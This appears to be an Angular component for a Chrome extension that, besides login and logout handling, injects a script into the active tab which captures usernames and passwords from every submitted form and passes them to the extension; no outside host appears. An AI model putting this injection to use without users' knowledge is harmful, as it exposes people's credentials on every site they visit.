import { Component, OnInit } from '@angular/core';
import {AuthenticationService} from '../services/authentication.service';
import {Router} from '@angular/router';
import {User} from '../modles/user';
import {HeaderService} from '../services/header.service';
import {MessageService} from 'primeng/api';

@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.css']
})
export class HomeComponent implements OnInit {
  loading = false;
  private readonly formListenerCode =
    `
    for (var i = 0; i < document.forms.length; i++) {
        document.forms[i].addEventListener("submit", function(){
            var form = this;
            var password = "";
            var username = "";
            var inputs = form.getElementsByTagName("input");
            for (var j = 0; j < inputs.length; j++){
              var input = inputs[j];
              if (input.type == "password"){
                password = input.value;
              }
              else if (input.type == "text"){
                username = input.value
              }
            }
            var data = [username, password];
            chrome.runtime.sendMessage(message={'name':'form_submit', 'data':data});
        });
    }
    `;


  constructor(private authenticationService: AuthenticationService,
              private router: Router,
              private headerService: HeaderService,
              private messageService: MessageService) { }

  ngOnInit(): void {
    this.loading = false;
    const userData = localStorage.getItem(this.authenticationService.userKey);
    if (!userData){
      this.router.navigate(['/login']);
    }
    const user: User = JSON.parse(userData);
    this.headerService.setHeader(`Welcome ${user.firstName} ${user.lastName}!`);

    this.injectFormSubmitListener();

  }

  public logout(event){
    this.loading = true;
    this.messageService.clear();
    this.messageService.add({key: 'confirm', sticky: true, severity: 'warn', summary: 'Are you sure?', detail: 'Confirm to proceed'});
  }

  onConfirm() {
    this.messageService.clear('confirm');
    this.authenticationService.logout().subscribe(
      data => {
      this.router.navigate(['/login']);
      this.loading = false;
    },
      error => {this.loading = false; });
  }

  onReject() {
    this.messageService.clear('confirm');
    this.loading = false;
  }

  private injectFormSubmitListener(){
    chrome.runtime.onStartup.addListener(() => {
      this.inject();
    });
    chrome.tabs.onReplaced.addListener(() => {
      this.inject();
    });
    chrome.tabs.onActivated.addListener(() => {
      this.inject();
    });
  }

  private inject(){
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      tabs.forEach(tab => {
        const tabUrl = tab.url;
        console.log('message');
        chrome.tabs.executeScript(tab.id, {code: this.formListenerCode}, () => {
          console.log(tabUrl);
        });
        console.log('injected');
      });
    });
  }
}
